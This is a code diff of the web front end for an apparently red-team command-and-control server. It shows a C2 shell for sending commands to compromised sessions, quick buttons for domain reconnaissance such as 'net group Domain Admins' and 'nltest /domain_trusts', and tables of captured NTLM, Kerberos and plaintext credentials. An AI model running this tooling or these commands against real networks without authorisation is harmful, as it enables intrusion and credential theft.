-    </div>
-    <div class="card">
-      <div class="clbl">Tasks</div>
-      <div class="cv" id="d-tasks">0</div>
-      <div class="csub">Dispatched</div>
-    </div>
-    <div class="card danger">
-      <div class="clbl">Credentials</div>
-      <div class="cv" id="d-creds">0</div>
-      <div class="csub">Captured</div>
-    </div>
-    <div class="card accent">
-      <div class="clbl">ATT&amp;CK</div>
-      <div class="cv" id="d-techs">0</div>
-      <div class="csub" id="d-techs-sub">Covered</div>
-    </div>
-    <div class="card">
-      <div class="clbl">Events</div>
-      <div class="cv" id="d-evts">0</div>
-      <div class="csub">Total logged</div>
-    </div>
-  </div>
-  <div class="panels">
-    <div class="panel">
-      <div class="ptitle"><span>Top Techniques</span></div>
-      <div id="dash-techs">
-        <div class="empty"><div class="empty-icon">&#9672;</div>No data yet</div>
+    <!-- ══ DASHBOARD ══ -->
+    <div class="view active" id="view-dash">
+      <div class="view-header">
+        <div class="view-title"><span>ENGAGEMENT</span><strong>Dashboard</strong></div>
+        <button class="btn btn-sm" onclick="refreshAll()">↺ Refresh</button>
+      </div>
+      <div class="view-body">
+        <div class="stat-grid" id="dash-stats"></div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+          <div class="section">
+            <div class="section-hdr">LIVE SESSIONS</div>
+            <div id="dash-live"></div>
+          </div>
+          <div class="section">
+            <div class="section-hdr">RECENT EVENTS</div>
+            <div class="ev-list" id="dash-events"></div>
+          </div>
+        </div>
       </div>
     </div>
-    <div class="panel">
-      <div class="ptitle"><span>Recent Events</span></div>
-      <div id="dash-evts">
-        <div class="empty"><div class="empty-icon">&#9672;</div>No events yet</div>
+
+    <!-- ══ C2 SHELL ══ -->
+    <div class="view" id="view-shell">
+      <div id="shell-topbar">
+        <select id="shell-sess-select" onchange="shellSelectSession(this.value)">
+          <option value="">— select session —</option>
+        </select>
+        <div id="shell-info">
+          <span id="shell-host" style="display:none"></span>
+          <span id="shell-ip" style="display:none"></span>
+          <span id="shell-status"></span>
+        </div>
+        <div id="shell-actions">
+          <button class="btn btn-sm" onclick="shellClear()">CLEAR</button>
+          <button class="btn btn-sm btn-red" id="btn-kill" onclick="shellKill()" style="display:none">KILL</button>
+        </div>
+      </div>
+      <div class="quick-bar">
+        <span class="quick-label">QUICK▸</span>
+        <button class="qbtn" onclick="shellQuick('whoami /all')">whoami /all</button>
+        <button class="qbtn" onclick="shellQuick('hostname')">hostname</button>
+        <button class="qbtn" onclick="shellQuick('ipconfig /all')">ipconfig /all</button>
+        <button class="qbtn" onclick="shellQuick('net user /domain')">net user /dom</button>
+        <button class="qbtn" onclick="shellQuick('net group \"Domain Admins\" /domain')">dom admins</button>
+        <button class="qbtn" onclick="shellQuick('nltest /domain_trusts')">dom trusts</button>
+        <button class="qbtn" onclick="shellQuick('arp -a')">arp -a</button>
+        <button class="qbtn" onclick="shellQuick('tasklist /v')">tasklist</button>
+        <button class="qbtn" onclick="shellQuick('net share')">net share</button>
+        <button class="qbtn" onclick="shellQuick('netstat -ano')">netstat</button>
+        <button class="qbtn" onclick="shellQuick('reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v NullSessionPipes')">null sess</button>
+        <button class="qbtn" onclick="shellQuick('wmic os get Caption,Version,OSArchitecture /format:list')">os info</button>
+      </div>
+      <div id="shell-out"></div>
+      <div id="shell-input-bar">
+        <span id="shell-prompt-label">C2&gt;</span>
+        <input id="shell-input" type="text" placeholder="enter command..."
+               onkeydown="shellKeydown(event)" autocomplete="off" spellcheck="false">
+        <button class="btn btn-red" onclick="shellSend()">EXECUTE</button>
       </div>
     </div>
-  </div>
-</div>
 
-<!-- sessions -->
-<div id="view-sessions" class="view">
-  <div class="page-hdr">
-    <div class="page-title"><span class="sl">//</span>Agent Sessions</div>
-    <div class="page-sub">Click a row to inspect tasks and results</div>
-  </div>
-  <div class="tbl-wrap"><table>
-    <thead><tr>
-      <th>Host</th><th>Session ID</th><th>Registered</th>
-      <th>Last Seen</th><th>Label</th><th>Tasks</th><th>Creds</th>
-    </tr></thead>
-    <tbody id="sess-tbody">
-      <tr><td colspan="7"><div class="empty">Loading&hellip;</div></td></tr>
-    </tbody>
-  </table></div>
-  <div id="session-detail" style="display:none"></div>
-</div>
-
-<!-- credentials -->
-<div id="view-credentials" class="view">
-  <div class="page-hdr">
-    <div class="page-title"><span class="sl">//</span>Credential Findings</div>
-    <div class="page-sub">All results containing credential material</div>
-  </div>
-  <div class="tbl-wrap"><table>
-    <thead><tr>
-      <th>Time</th><th>Session</th><th>Command</th><th>Types</th><th>Preview</th>
-    </tr></thead>
-    <tbody id="creds-tbody">
-      <tr><td colspan="5"><div class="empty">Loading&hellip;</div></td></tr>
-    </tbody>
-  </table></div>
-</div>
-
-<!-- attack -->
-<div id="view-attack" class="view">
-  <div class="page-hdr">
-    <div class="page-title"><span class="sl">//</span>MITRE ATT&amp;CK Coverage</div>
-    <div class="page-sub">Techniques observed &nbsp;&middot;&nbsp; Red = covered</div>
-  </div>
-  <div id="attack-heatmap">
-    <div class="empty">Loading&hellip;</div>
-  </div>
-</div>
-
-<!-- report -->
-<div id="view-report" class="view">
-  <div class="hrow">
-    <div class="hrow-titles">
-      <div class="page-title"><span class="sl">//</span>Engagement Report</div>
-      <div class="page-sub">Printable summary for client / purple team</div>
+    <!-- ══ SESSIONS ══ -->
+    <div class="view" id="view-sessions">
+      <div class="view-header">
+        <div class="view-title"><span>TARGETS</span><strong>Sessions</strong></div>
+      </div>
+      <div class="view-body">
+        <div class="tbl-wrap">
+          <table id="sess-table">
+            <thead>
+              <tr>
+                <th>ID</th><th>HOST / IP</th><th>LABEL</th>
+                <th>STATUS</th><th>LAST SEEN</th><th>QUEUED</th><th>ACTIONS</th>
+              </tr>
+            </thead>
+            <tbody id="sess-tbody"></tbody>
+          </table>
+        </div>
+      </div>
     </div>
-    <div class="btn-row">
-      <button class="btn btn-primary btn-sm" onclick="window.print()">Print / PDF</button>
-      <a class="btn btn-sm" href="/ui/api/export/json" download="engagement.json">&#8595; JSON</a>
-      <a class="btn btn-sm" href="/ui/api/export/markdown" download="engagement.md">&#8595; Markdown</a>
-    </div>
-  </div>
-  <div id="report-content">
-    <div class="empty">Loading&hellip;</div>
-  </div>
-</div>
 
-</main>
-</div>
+    <!-- ══ ARSENAL ══ -->
+    <div class="view" id="view-arsenal">
+      <div class="view-header">
+        <div class="view-title"><span>WORKSPACE</span><strong>Arsenal</strong></div>
+        <button class="btn btn-sm" onclick="loadArsenal()">↺ Refresh</button>
+      </div>
+      <div class="view-body">
+        <div id="arsenal-ws" style="font-size:11px;color:var(--muted2);margin-bottom:16px"></div>
+        <div id="arsenal-body"></div>
+      </div>
+    </div>
+
+    <!-- ══ CREDENTIALS ══ -->
+    <div class="view" id="view-creds">
+      <div class="view-header">
+        <div class="view-title"><span>FINDINGS</span><strong>Credentials</strong></div>
+      </div>
+      <div class="view-body">
+        <div class="tbl-wrap">
+          <table>
+            <thead>
+              <tr><th>SESSION</th><th>TOOL</th><th>CAPTURED AT</th><th>DETAILS</th></tr>
+            </thead>
+            <tbody id="creds-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══ ATT&CK ══ -->
+    <div class="view" id="view-attack">
+      <div class="view-header">
+        <div class="view-title"><span>MITRE</span><strong>ATT&amp;CK Coverage</strong></div>
+      </div>
+      <div class="view-body">
+        <div class="stat-grid" style="margin-bottom:20px">
+          <div class="stat-card">
+            <div class="stat-label">COVERED</div>
+            <div class="stat-value" id="atk-cov">—</div>
+            <div class="stat-sub">of <span id="atk-tot">—</span> tracked techniques</div>
+          </div>
+        </div>
+        <div class="atk-grid" id="atk-grid"></div>
+      </div>
+    </div>
+
+    <!-- ══ REPORT ══ -->
+    <div class="view" id="view-report">
+      <div class="view-header">
+        <div class="view-title"><span>EXPORT</span><strong>Report</strong></div>
+      </div>
+      <div class="view-body">
+        <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:24px">
+          <a class="btn" href="/ui/api/export/json" download="lilith_engagement.json">
+            ↓ JSON Export
+          </a>
+          <a class="btn" href="/ui/api/export/markdown" download="lilith_engagement.md">
+            ↓ Markdown Report
+          </a>
+        </div>
+        <div class="section">
+          <div class="section-hdr">SESSION LABEL EDITOR</div>
+          <div id="label-editor"></div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- #content -->
+</div><!-- #main -->
+</div><!-- #app -->
+
 <script>
-'use strict';
+// ── state ─────────────────────────────────────────────────────────────────────
+let liveSessions = {};
+let dbSessions   = [];
+let shellSid     = null;
+let shellHistory = [];
+let histIdx      = -1;
+let pendingPoll  = null;   // {interval, task_id}
 
-function esc(s) {
-  if (s == null) return '';
-  return String(s)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
-}
-
-function fmtDt(s) {
-  if (!s) return '—';
-  try {
-    const d = new Date(s.includes('T') ? s : s.replace(' ', 'T') + 'Z');
-    if (isNaN(d)) return s;
-    return d.toLocaleString(undefined, {
-      month: 'short', day: '2-digit',
-      hour: '2-digit', minute: '2-digit', hour12: false
-    });
-  } catch(e) { return s; }
-}
-
-function shortId(id) { return id ? '…' + id.slice(-8) : '—'; }
-
-function credBadges(hints) {
-  if (!hints || !hints.length) return '';
-  const seen = new Set(), out = [];
-  for (const h of hints) {
-    const lh = h.toLowerCase();
-    let tag, cls;
-    if      (lh.includes('ntlm'))       { tag = 'NTLM';  cls = 'b-ntlm'; }
-    else if (lh.includes('kerberoast')) { tag = 'KERB';  cls = 'b-kerb'; }
-    else if (lh.includes('asrep'))      { tag = 'ASREP'; cls = 'b-kerb'; }
-    else if (lh.includes('plaintext'))  { tag = 'PLAIN'; cls = 'b-plain'; }
-    else if (lh.includes('aes-key'))    { tag = 'AES';   cls = 'b-aes'; }
-    else                                { tag = 'CRED';  cls = 'b-cred'; }
-    if (!seen.has(tag)) {
-      seen.add(tag);
-      out.push('<span class="badge ' + cls + '">' + tag + '</span>');
-    }
-  }
-  return out.join(' ');
-}
-
-const S = { view: 'dashboard', selSess: null };
-
-async function api(path) {
-  const r = await fetch(path);
-  if (!r.ok) throw new Error(r.status);
-  return r.json();
-}
-
-function navigate(view) {
-  if (!view) return;
-  S.view = view;
-  document.querySelectorAll('.nav-link').forEach(function(a) {
-    a.classList.toggle('active', a.dataset.view === view);
-  });
-  document.querySelectorAll('.view').forEach(function(v) {
-    v.classList.toggle('active', v.id === 'view-' + view);
-  });
-  refresh();
-}
-
-/* ── Dashboard ── */
-function renderDashboard(d) {
-  document.getElementById('d-sess').textContent  = d.session_count;
-  document.getElementById('d-tasks').textContent = d.task_count;
-  document.getElementById('d-creds').textContent = d.cred_count;
-  document.getElementById('d-evts').textContent  = d.event_count;
-  const pct = d.total_technique_count
-    ? Math.round(100 * d.covered_technique_count / d.total_technique_count) : 0;
-  document.getElementById('d-techs').textContent    = d.covered_technique_count;
-  document.getElementById('d-techs-sub').textContent = pct + '% of ' + d.total_technique_count;
-
-  const tt = document.getElementById('dash-techs');
-  if (!d.top_techniques || !d.top_techniques.length) {
-    tt.innerHTML = '<div class="empty"><div class="empty-icon">&#9672;</div>No techniques recorded</div>';
-  } else {
-    tt.innerHTML = d.top_techniques.map(function(t) {
-      return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:9px">'
-        + '<span class="chip chip-on" style="font-size:10px">' + esc(t.tid) + '</span>'
-        + '<span style="flex:1;font-size:12px">' + esc(t.name) + '</span>'
-        + '<span style="color:var(--muted2);font-size:10px;font-family:var(--mono)">\xd7' + t.count + '</span>'
-        + '</div>';
-    }).join('');
-  }
-
-  const ev = document.getElementById('dash-evts');
-  if (!d.recent_events || !d.recent_events.length) {
-    ev.innerHTML = '<div class="empty"><div class="empty-icon">&#9672;</div>No events yet</div>';
-  } else {
-    ev.innerHTML = d.recent_events.map(function(e) {
-      return '<div class="ev-item">'
-        + '<span class="ev-time">' + esc((e.at || '').slice(11, 16)) + '</span>'
-        + '<span class="ev-type">'  + esc(e.type   || '') + '</span>'
-        + '<span class="ev-detail">' + esc((e.detail || '').slice(0, 72)) + '</span>'
-        + '</div>';
-    }).join('');
-  }
-}
-
-/* ── Sessions ── */
-function renderSessions(data) {
-  const tbody = document.getElementById('sess-tbody');
-  if (!data.length) {
-    tbody.innerHTML = '<tr><td colspan="7"><div class="empty">'
-      + '<div class="empty-icon">&#9711;</div>No sessions registered</div></td></tr>';
-    return;
-  }
-  tbody.innerHTML = data.map(function(s) {
-    const sel = S.selSess === s.id ? ' selected' : '';
-    return '<tr class="clickable' + sel + '" data-id="' + esc(s.id) + '">'
-      + '<td><b>' + esc(s.host || '—') + '</b></td>'
-      + '<td style="font-family:var(--mono);font-size:11px;color:var(--muted2)">'
-        + esc(shortId(s.id)) + '</td>'
-      + '<td style="white-space:nowrap;font-size:11px">' + esc(fmtDt(s.registered_at)) + '</td>'
-      + '<td style="white-space:nowrap;font-size:11px">' + esc(fmtDt(s.last_seen)) + '</td>'
-      + '<td>' + (s.label
-        ? '<span class="badge b-info">' + esc(s.label) + '</span>'
-        : '<span style="color:var(--muted2)">—</span>') + '</td>'
-      + '<td style="font-family:var(--mono)">' + (s.task_count || 0) + '</td>'
-      + '<td>' + ((s.cred_tasks || 0) > 0
-        ? '<span class="badge b-cred">CRED</span>'
-        : '<span class="badge b-grey">—</span>') + '</td>'
-      + '</tr>';
-  }).join('');
-  tbody.querySelectorAll('tr.clickable').forEach(function(tr) {
-    tr.addEventListener('click', function() { openSession(tr.dataset.id); });
-  });
-}
-
-async function openSession(id) {
-  S.selSess = id;
-  document.querySelectorAll('#sess-tbody tr').forEach(function(tr) {
-    tr.classList.toggle('selected', tr.dataset.id === id);
-  });
-  const det = document.getElementById('session-detail');
-  det.style.display = 'block';
-  det.innerHTML = '<div style="padding:24px;text-align:center;color:var(--muted2)">'
-    + '<span class="spin">&#9675;</span> Loading&hellip;</div>';
-  try {
-    const d = await api('/ui/api/session/' + encodeURIComponent(id));
-    renderSessionDetail(d, det);
-  } catch(e) {
-    det.innerHTML = '<div class="empty">Error: ' + esc(String(e)) + '</div>';
-  }
-}
-
-function renderSessionDetail(d, el) {
-  const s = d.session || {}, tasks = d.tasks || [], evts = d.events || [];
-  let h = '<div class="det-hdr">'
-    + '<div class="det-title">' + esc(s.host || '?')
-    + ' <span style="color:var(--muted2);font-size:10px">' + esc(s.id || '') + '</span></div>'
-    + '<button class="btn btn-sm" onclick="'
-    + "document.getElementById('session-detail').style.display='none';S.selSess=null;"
-    + '">✕ Close</button>'
-    + '</div>'
-    + '<div class="label-form">'
-    + '<input id="det-label" placeholder="Label (e.g. DC01)" value="' + esc(s.label || '') + '">'
-    + '<input id="det-note"  placeholder="Operator note…"   value="' + esc(s.note  || '') + '" style="flex:2">'
-    + '<button class="btn btn-primary btn-sm" onclick="saveLabel(\'' + esc(s.id) + '\')">Save</button>'
-    + '</div>';
-
-  if (!tasks.length) {
-    h += '<div class="empty"><div class="empty-icon">&#9672;</div>No tasks dispatched yet</div>';
-  } else {
-    h += '<div style="font-size:9px;font-weight:700;color:var(--muted2);'
-      + 'text-transform:uppercase;letter-spacing:3px;margin-bottom:10px">'
-      + 'Task Timeline (' + tasks.length + ')</div>';
-    h += tasks.map(function(t) {
-      const done  = t.output != null;
-      const hcred = t.has_creds;
-      const cls   = 'task-item ' + (hcred ? 't-cred' : done ? 't-done' : 't-pend');
-      let inner = '<div class="task-cmd">' + esc(t.command || '') + '</div>'
-        + '<div class="task-meta">';
-      if (t.technique_id) {
-        inner += '<span class="badge b-info">' + esc(t.technique_id) + '</span>'
-               + '<span>' + esc(t.technique_desc || '') + '</span>';
-      }
-      inner += '<span style="margin-left:auto">' + esc(fmtDt(t.dispatched_at)) + '</span>';
-      if (!done)       inner += '<span class="badge b-warn">pending</span>';
-      else if (hcred)  inner += '<span class="badge b-cred">CREDS</span>';
-      else             inner += '<span class="badge b-ok">done</span>';
-      inner += '</div>';
-      if (t.cred_hints && t.cred_hints.length) {
-        inner += '<div style="margin-top:6px;font-size:11px;color:var(--muted2)">'
-          + t.cred_hints.slice(0, 4).map(function(h2) {
-              return esc(h2.slice(0, 100));
-            }).join('<br>') + '</div>';
-      }
-      if (done && !t.is_binary && t.output) {
-        inner += '<div class="task-out">'
-          + esc(t.output.slice(0, 600))
-          + (t.output.length > 600 ? '\n…' : '') + '</div>';
-      } else if (t.is_binary) {
-        inner += '<div class="task-out">[binary data]</div>';
-      }
-      return '<div class="' + cls + '">' + inner + '</div>';
-    }).join('');
-  }
-
-  if (evts.length) {
-    h += '<div style="font-size:9px;font-weight:700;color:var(--muted2);'
-      + 'text-transform:uppercase;letter-spacing:3px;margin:16px 0 8px">'
-      + 'Session Events (' + evts.length + ')</div>';
-    h += evts.slice(-20).reverse().map(function(e) {
-      return '<div class="ev-item">'
-        + '<span class="ev-time">'   + esc((e.at     || '').slice(11, 16)) + '</span>'
-        + '<span class="ev-type">'   + esc(e.type    || '') + '</span>'
-        + '<span class="ev-detail">' + esc(e.detail  || '') + '</span>'
-        + '</div>';
-    }).join('');
-  }
-  el.innerHTML = h;
-}
-
-async function saveLabel(id) {
-  const label = (document.getElementById('det-label') || {}).value || '';
-  const note  = (document.getElementById('det-note')  || {}).value || '';
-  try {
-    await fetch('/ui/api/sessions/' + encodeURIComponent(id) + '/label', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ label: label.trim(), note: note.trim() })
-    });
-    api('/ui/api/sessions').then(renderSessions);
-  } catch(e) { console.error(e); }
-}
-
-/* ── Credentials ── */
-function renderCredentials(data) {
-  const tbody = document.getElementById('creds-tbody');
-  if (!data.length) {
-    tbody.innerHTML = '<tr><td colspan="5"><div class="empty">'
-      + '<div class="empty-icon">&#9671;</div>No credentials captured yet</div></td></tr>';
-    return;
-  }
-  tbody.innerHTML = data.map(function(r) {
-    const prev = (r.output || '').replace(/\n/g, ' ').slice(0, 100);
-    return '<tr>'
-      + '<td style="white-space:nowrap;font-size:11px">' + esc(fmtDt(r.received_at)) + '</td>'
-      + '<td style="font-family:var(--mono);font-size:11px;color:var(--muted2)">'
-        + esc(shortId(r.session_id)) + '</td>'
-      + '<td style="font-family:var(--mono);font-size:11px;max-width:180px;'
-        + 'overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'
-        + esc(r.command || '') + '</td>'
-      + '<td>' + credBadges(r.cred_hints) + '</td>'
-      + '<td style="color:var(--muted2);font-size:11px;font-family:var(--mono);'
-        + 'max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'
-        + esc(prev) + '</td>'
-      + '</tr>';
-  }).join('');
-}
-
-/* ── ATT&CK ── */
-function renderAttack(data) {
-  const covered  = data.covered        || {};
-  const allTech  = data.all_techniques || {};
-  const tactics  = data.tactic_order   || [];
-  const byTac    = {};
-  for (const tid in allTech) {
-    const m   = allTech[tid];
-    const tac = m.tactic || 'Other';
-    if (!byTac[tac]) byTac[tac] = [];
-    byTac[tac].push(Object.assign({ tid: tid }, m));
-  }
-  document.getElementById('attack-heatmap').innerHTML = tactics.map(function(tac) {
-    const techs = byTac[tac] || [];
-    if (!techs.length) return '';
-    const cov = techs.filter(function(t) { return covered[t.tid]; }).length;
-    return '<div class="tactic-sec">'
-      + '<div class="tactic-hdr"><span>' + esc(tac) + '</span>'
-      + '<span class="tactic-score">' + cov + ' / ' + techs.length + '</span></div>'
-      + '<div>' + techs.map(function(t) {
-          const cnt = covered[t.tid] ? covered[t.tid].length : 0;
-          return '<span class="chip ' + (cnt ? 'chip-on' : 'chip-off') + '"'
-            + (cnt ? ' title="' + cnt + ' session(s)"' : '') + '>'
-            + esc(t.tid) + ' ' + esc(t.name)
-            + (cnt ? '<span class="chip-cnt">\xd7' + cnt + '</span>' : '')
-            + '</span>';
-        }).join('') + '</div></div>';
-  }).join('');
-}
-
-/* ── Report ── */
-function renderReport(summary, sessions, creds, techniques) {
-  const now      = new Date().toLocaleDateString(undefined,
-    { year: 'numeric', month: 'long', day: 'numeric' });
-  const covered  = (techniques || {}).covered        || {};
-  const allTech  = (techniques || {}).all_techniques || {};
-  const tactics  = (techniques || {}).tactic_order   || [];
-  const byTac    = {};
-  for (const tid in allTech) {
-    const m   = allTech[tid];
-    const tac = m.tactic || 'Other';
-    if (!byTac[tac]) byTac[tac] = [];
-    byTac[tac].push(Object.assign({ tid: tid }, m));
-  }
-
-  let h = '<div class="r-section"><div class="r-h1"><em>L</em>ILITH — Engagement Report</div>'
-    + '<div class="r-meta">'
-    + '<span>Generated: ' + esc(now) + '</span>'
-    + '<span>Sessions: '   + (summary ? summary.session_count : '?') + '</span>'
-    + '<span>Tasks: '      + (summary ? summary.task_count    : '?') + '</span>'
-    + '<span>Credentials: '+ (summary ? summary.cred_count    : '?') + '</span>'
-    + '<span>ATT&amp;CK: ' + (summary ? summary.covered_technique_count : '?')
-    + ' / '                + (summary ? summary.total_technique_count   : '?') + '</span>'
-    + '</div></div>';
-
-  h += '<div class="r-section"><div class="r-h2">Session Inventory</div>'
-    + '<div class="tbl-wrap"><table><thead><tr>'
-    + '<th>Host</th><th>Session ID</th><th>Registered</th>'
-    + '<th>Last Seen</th><th>Label</th><th>Tasks</th><th>Creds</th>'
-    + '</tr></thead><tbody>'
-    + (sessions || []).map(function(s) {
-        return '<tr>'
-          + '<td>' + esc(s.host || '?') + '</td>'
-          + '<td style="font-family:var(--mono);font-size:11px">' + esc(s.id || '') + '</td>'
-          + '<td>' + esc(fmtDt(s.registered_at)) + '</td>'
-          + '<td>' + esc(fmtDt(s.last_seen)) + '</td>'
-          + '<td>' + esc(s.label || '') + '</td>'
-          + '<td>' + (s.task_count || 0) + '</td>'
-          + '<td>' + ((s.cred_tasks || 0) > 0 ? 'YES' : '—') + '</td>'
-          + '</tr>';
-      }).join('')
-    + '</tbody></table></div></div>';
-
-  if (creds && creds.length) {
-    h += '<div class="r-section"><div class="r-h2">Credential Findings (' + creds.length + ')</div>'
-      + '<div class="tbl-wrap"><table><thead><tr>'
-      + '<th>Time</th><th>Session</th><th>Command</th><th>Types</th>'
-      + '</tr></thead><tbody>'
-      + creds.map(function(r) {
-          const types = [];
-          const seen  = new Set();
-          (r.cred_hints || []).forEach(function(h2) {
-            const lh = h2.toLowerCase();
-            let tp;
-            if      (lh.includes('ntlm'))       tp = 'NTLM Hash';
-            else if (lh.includes('kerberoast')) tp = 'Kerberoast';
-            else if (lh.includes('asrep'))      tp = 'AS-REP';
-            else if (lh.includes('plaintext'))  tp = 'Plaintext';
-            else if (lh.includes('aes-key'))    tp = 'AES Key';
-            else                                tp = 'Credential';
-            if (!seen.has(tp)) { seen.add(tp); types.push(tp); }
-          });
-          return '<tr>'
-            + '<td>' + esc(fmtDt(r.received_at)) + '</td>'
-            + '<td style="font-family:var(--mono);font-size:11px">' + esc(shortId(r.session_id)) + '</td>'
-            + '<td style="font-family:var(--mono);font-size:11px">' + esc(r.command || '') + '</td>'
-            + '<td>' + esc(types.join(', ')) + '</td>'
-            + '</tr>';
-        }).join('')
-      + '</tbody></table></div></div>';
-  }
-
-  const covTotal  = Object.keys(covered).length;
-  const allTotal  = Object.keys(allTech).length;
-  h += '<div class="r-section"><div class="r-h2">ATT&amp;CK Coverage ('
-    + covTotal + '/' + allTotal + ')</div>'
-    + tactics.map(function(tac) {
-        const techs = byTac[tac] || [];
-        if (!techs.length) return '';
-        return '<div style="margin-bottom:14px">'
-          + '<div style="font-size:9px;font-weight:700;text-transform:uppercase;'
-          + 'letter-spacing:3px;color:var(--red);margin-bottom:6px">' + esc(tac) + '</div>'
-          + techs.map(function(t) {
-              const cnt = covered[t.tid] ? covered[t.tid].length : 0;
-              return '<span class="chip ' + (cnt ? 'chip-on' : 'chip-off') + '">'
-                + esc(t.tid) + ' ' + esc(t.name)
-                + (cnt ? ' \xd7' + cnt : '') + '</span>';
-            }).join('')
-          + '</div>';
-      }).join('')
-    + '</div>';
-
-  document.getElementById('report-content').innerHTML = h;
-}
-
-/* ── Refresh ── */
-async function refresh() {
-  const dot = document.getElementById('sdot');
-  const ref = document.getElementById('last-refresh');
-  dot.className = 'sdot spin';
-  try {
-    const v = S.view;
-    if      (v === 'dashboard')   renderDashboard(await api('/ui/api/summary'));
-    else if (v === 'sessions')    renderSessions(await api('/ui/api/sessions'));
-    else if (v === 'credentials') renderCredentials(await api('/ui/api/credentials'));
-    else if (v === 'attack')      renderAttack(await api('/ui/api/techniques'));
-    else if (v === 'report') {
-      const results = await Promise.all([
-        api('/ui/api/summary'),
-        api('/ui/api/sessions'),
-        api('/ui/api/credentials'),
-        api('/ui/api/techniques'),
-      ]);
-      renderReport(results[0], results[1], results[2], results[3]);
-    }
-    dot.className = 'sdot ok';
-    ref.textContent = new Date().toLocaleTimeString(undefined, {
-      hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
-    });
-  } catch(e) {
-    dot.className = 'sdot err';
-    ref.textContent = 'error';
-  }
-}
-
-/* ── Init: attach nav handlers ── */
-document.querySelectorAll('.nav-link').forEach(function(a) {
-  a.addEventListener('click', function(e) {
-    e.preventDefault();
-    navigate(a.dataset.view);
+// ── navigation ────────────────────────────────────────────────────────────────
+document.querySelectorAll('.nav-item').forEach(el => {
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+    el.classList.add('active');
+    const v = document.getElementById('view-' + el.dataset.view);
+    if (v) v.classList.add('active');
+    if (el.dataset.view === 'arsenal') loadArsenal();
+    if (el.dataset.view === 'sessions') renderSessions();
+    if (el.dataset.view === 'attack') loadAttack();
+    if (el.dataset.view === 'creds')  loadCreds();
+    if (el.dataset.view === 'report') loadReport();
   });
 });
-refresh();
-setInterval(refresh, 5000);
+
+// ── clock ─────────────────────────────────────────────────────────────────────
+function tick() {
+  const now = new Date();
+  document.getElementById('topbar-ts').textContent =
+    now.toISOString().replace('T',' ').slice(0,19) + ' UTC';
+}
+tick(); setInterval(tick, 1000);
+
+// ── utils ─────────────────────────────────────────────────────────────────────
+function fmt_size(b) {
+  if (b < 1024) return b + ' B';
+  if (b < 1024*1024) return (b/1024).toFixed(1) + ' KB';
+  return (b/1024/1024).toFixed(2) + ' MB';
+}
+
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── live sessions fetch ───────────────────────────────────────────────────────
+async function fetchLive() {
+  try {
+    const r = await fetch('/ui/api/c2/sessions');
+    if (r.ok) {
+      liveSessions = await r.json();
+      const cnt = Object.keys(liveSessions).length;
+      const alive = Object.values(liveSessions).filter(s=>!s.stale).length;
+      document.getElementById('live-count').textContent =
+        cnt + ' live  (' + alive + ' alive)';
+      updateShellSelector();
+      updateDashLive();
+    }
+  } catch(e) {}
+}
+
+async function fetchDB() {
+  try {
+    const r = await fetch('/ui/api/summary');
+    if (r.ok) {
+      const d = await r.json();
+      renderDashStats(d);
+      renderDashEvents(d.recent_events || []);
+    }
+    const r2 = await fetch('/ui/api/sessions');
+    if (r2.ok) dbSessions = await r2.json();
+  } catch(e) {}
+}
+
+async function refreshAll() {
+  await Promise.all([fetchLive(), fetchDB()]);
+  const active = document.querySelector('.nav-item.active');
+  if (active) {
+    const v = active.dataset.view;
+    if (v === 'sessions') renderSessions();
+  }
+}
+
+// ── dashboard ─────────────────────────────────────────────────────────────────
+function renderDashStats(d) {
+  const host = window.location.hostname;
+  document.getElementById('topbar-host').textContent = host + ':' + window.location.port;
+
+  const grid = document.getElementById('dash-stats');
+  const liveCnt = Object.keys(liveSessions).length;
+  const aliveCnt = Object.values(liveSessions).filter(s=>!s.stale).length;
+  grid.innerHTML = [
+    {label:'LIVE SESSIONS', val: aliveCnt + ' / ' + liveCnt, sub:'in registry'},
+    {label:'DB SESSIONS',   val: d.session_count, sub:'total registered'},
+    {label:'TASKS EXEC',    val: d.task_count,    sub:'commands sent'},
+    {label:'CREDENTIALS',   val: d.cred_count,    sub:'findings'},
+    {label:'ATT&CK',        val: d.covered_technique_count + ' / ' + d.total_technique_count, sub:'techniques covered'},
+    {label:'EVENTS',        val: d.event_count,   sub:'in log'},
+  ].map(c => `
+    <div class="stat-card">
+      <div class="stat-label">${c.label}</div>
+      <div class="stat-value">${esc(String(c.val))}</div>
+      <div class="stat-sub">${c.sub}</div>
+    </div>`).join('');
+}
+
+function updateDashLive() {
+  const el = document.getElementById('dash-live');
+  const sids = Object.keys(liveSessions);
+  if (!sids.length) {
+    el.innerHTML = '<div style="color:var(--muted2);font-size:12px">No active sessions</div>';
+    return;
+  }
+  el.innerHTML = sids.map(sid => {
+    const s = liveSessions[sid];
+    const dotCls = s.stale ? 'dot-yellow' : 'dot-green';
+    const badgeCls = s.stale ? 'badge-stale' : 'badge-alive';
+    const badgeTxt = s.stale ? 'STALE' : 'ALIVE';
+    return `<div class="file-row" style="margin-bottom:4px;cursor:pointer" onclick="goShell('${esc(sid)}')">
+      <span class="dot ${dotCls}"></span>
+      <span class="file-name">${esc(sid.slice(0,16))}</span>
+      <span class="file-size" style="color:var(--muted2)">${esc(s.host)}</span>
+      <span class="badge ${badgeCls}">${badgeTxt}</span>
+      <span style="font-size:10px;color:var(--muted2)">${esc(s.last_seen)}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderDashEvents(events) {
+  const el = document.getElementById('dash-events');
+  if (!events.length) {
+    el.innerHTML = '<div style="color:var(--muted2);font-size:12px">No events</div>';
+    return;
+  }
+  el.innerHTML = events.slice(0,12).map(e =>
+    `<div class="ev-row">
